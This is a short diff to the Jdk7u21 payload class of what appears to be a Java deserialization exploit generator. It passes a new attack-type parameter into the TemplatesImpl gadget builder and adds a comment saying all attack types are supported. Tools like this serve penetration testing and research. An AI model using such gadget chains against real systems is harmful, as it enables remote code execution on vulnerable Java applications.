@@ -58,9 +58,11 @@ LinkedHashSet.readObject()
 @Dependencies()
 @Authors({ Authors.FROHOFF })
 public class Jdk7u21 implements ObjectPayload<Object> {
+	
+	// federicodotta - All supported (TemplateImpl)
 
 	public Object getObject(final String command, String attackType) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command, attackType);
 
 		String zeroHashCodeStr = "f5a5a608";
 
